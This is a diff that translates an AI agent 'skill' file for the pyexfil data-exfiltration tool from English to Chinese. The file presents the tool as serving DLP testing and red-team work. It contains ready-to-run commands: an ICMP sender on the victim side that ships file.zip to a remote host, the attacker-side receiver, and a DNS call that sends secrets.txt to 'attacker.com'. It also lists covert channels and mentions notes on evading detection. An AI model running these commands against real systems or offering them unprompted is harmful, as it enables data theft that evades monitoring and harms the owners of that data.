@@ -1,32 +1,29 @@
 ---
 name: pyexfil
 description: >
-  This skill should be used when the user asks about "pyexfil", "testing DLP
-  controls", "exfiltrating data through unconventional protocols".
-  Multi-channel data exfiltration tool supporting 20+ covert channels (ICMP,
-  DNS, HTTPS, SMTP, Slack, QUIC).
+  此技能适用于用户询问关于 "pyexfil"、"测试 DLP 控制措施"、"通过非常规协议进行数据外泄" 等内容。多通道数据外泄工具，支持 20+ 种隐蔽通道（ICMP、DNS、HTTPS、SMTP、Slack、QUIC）。
 ---
 
 # PyExfil
 
-Multi-channel exfiltration — 20+ covert channels for DLP testing and red-team ops.
+多通道外泄工具 —— 20+ 种隐蔽通道，用于 DLP 测试和红队行动。
 
-## Quick Start
+## 快速开始
 
 ```bash
 pip install pyexfil
 
-# ICMP exfil — sender (victim)
+# ICMP 外泄 —— 发送端（受害者）
 python -c "from pyexfil.network.ICMP.icmp_exfil import Send; Send('192.168.1.100', open('file.zip','rb').read())"
 
-# ICMP receiver (attacker)
+# ICMP 接收端（攻击者）
 python -c "from pyexfil.network.ICMP.icmp_exfil import Receive; Receive('0.0.0.0', 'out.zip')"
 ```
 
-## Exfil Channels
+## 外泄通道
 
-| Channel | Module path |
-|---------|-------------|
+| 通道 | 模块路径 |
+|------|----------|
 | ICMP | `network.ICMP` |
 | DNS | `network.DNS` |
 | HTTPS POST | `network.HTTPS` |
@@ -36,24 +33,24 @@ python -c "from pyexfil.network.ICMP.icmp_exfil import Receive; Receive('0.0.0.0
 | NTP | `network.NTP` |
 | BGP | `network.BGP` |
 | QUIC | `network.QUIC` |
-| audio (microphone) | `physical.audio` |
+| 音频（麦克风） | `physical.audio` |
 
-## Common Workflows
+## 常用工作流程
 
-**DNS exfil:**
+**DNS 外泄：**
 ```python
 from pyexfil.network.DNS.dns_exfil import Send
 Send(nameserver='attacker.com', data=open('secrets.txt','rb').read())
 ```
 
-**Test all channels systematically:**
+**系统性测试所有通道：**
 ```bash
-# Use individual module scripts in pyexfil/network/
+# 使用 pyexfil/network/ 下的各模块脚本
 python pyexfil/network/ICMP/icmp_exfil.py --help
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
-|------|--------------|
-| `references/` | Channel setup and detection evasion notes |
+| 文件 | 加载时机 |
+|------|----------|
+| `references/` | 通道配置与检测规避说明 |
